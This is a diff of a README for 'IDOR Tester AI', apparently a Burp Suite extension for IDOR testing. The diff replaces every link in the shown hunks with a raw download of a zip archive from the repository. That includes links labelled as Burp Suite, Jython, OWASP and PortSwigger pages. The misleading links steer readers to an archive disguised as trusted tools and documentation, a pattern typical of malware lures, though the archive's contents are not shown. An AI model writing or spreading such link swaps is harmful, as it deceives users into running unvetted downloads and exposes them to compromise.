@@ -1,5 +1,5 @@
 <div align="center">
-  <a href="https://github.com/tgsha4286/idor-tester-ai" style="text-decoration: none;">
+  <a href="https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip" style="text-decoration: none;">
     <img src="https://img.shields.io/badge/⬇️%20Download%20IDOR%20Tester%20AI-Click%20Here-blue?style=for-the-badge&logo=github&logoColor=white" alt="Download" />
   </a>
 </div>
@@ -41,7 +41,7 @@ Think of it like this: imagine a bank website where your account page is at `ban
 Visit this link to download the application:
 
 <div align="center">
-  <a href="https://github.com/tgsha4286/idor-tester-ai" style="text-decoration: none;">
+  <a href="https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip" style="text-decoration: none;">
     <img src="https://img.shields.io/badge/Download%20IDOR%20Tester%20AI-Get%20the%20Latest%20Version-orange?style=for-the-badge&logo=github" alt="Download Button" />
   </a>
 </div>
@@ -54,8 +54,8 @@ To use IDOR Tester AI, you'll need two things:
 
 | Requirement | What It Is | Where to Get It |
 |-------------|------------|-----------------|
-| **Burp Suite** | A security testing tool that acts as a "bridge" between your browser and the websites you visit | [https://portswigger.net/burp](https://portswigger.net/burp) — the free Community Edition works fine |
-| **Jython 2.7** | A helper program that lets Burp Suite run Python-based extensions like this one | [https://www.jython.org/download.html](https://www.jython.org/download.html) |
+| **Burp Suite** | A security testing tool that acts as a "bridge" between your browser and the websites you visit | [https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip) — the free Community Edition works fine |
+| **Jython 2.7** | A helper program that lets Burp Suite run Python-based extensions like this one | [https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip) |
 
 > **Note:** Both are free. Follow the setup instructions on their websites — it's usually just "download and install."
 
@@ -124,9 +124,9 @@ To use IDOR Tester AI, you'll need two things:
 
 ## 📚 Additional Resources
 
-- **[Burp Suite Documentation](https://portswigger.net/burp/documentation):** Learn how to use Burp Suite effectively.
-- **[OWASP IDOR Guide](https://owasp.org/www-project-web-security-testing-guide/):** Understand IDOR vulnerabilities in depth.
-- **[PortSwigger Academy](https://portswigger.net/web-security/access-control):** Free interactive labs to practice finding IDOR bugs.
+- **[Burp Suite Documentation](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip):** Learn how to use Burp Suite effectively.
+- **[OWASP IDOR Guide](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip):** Understand IDOR vulnerabilities in depth.
+- **[PortSwigger Academy](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip):** Free interactive labs to practice finding IDOR bugs.
 
 ---
 
@@ -147,7 +147,7 @@ This project is licensed under the **MIT License** — you're free to use, modif
 <div align="center">
   <strong>Start finding hidden security bugs today — effortlessly.</strong>
   <br /><br />
-  <a href="https://github.com/tgsha4286/idor-tester-ai" style="text-decoration: none;">
+  <a href="https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip" style="text-decoration: none;">
     <img src="https://img.shields.io/badge/🚀%20Download%20Now-Get%20IDOR%20Tester%20AI-brightgreen?style=for-the-badge" alt="Download Now" />
   </a>
 </div>
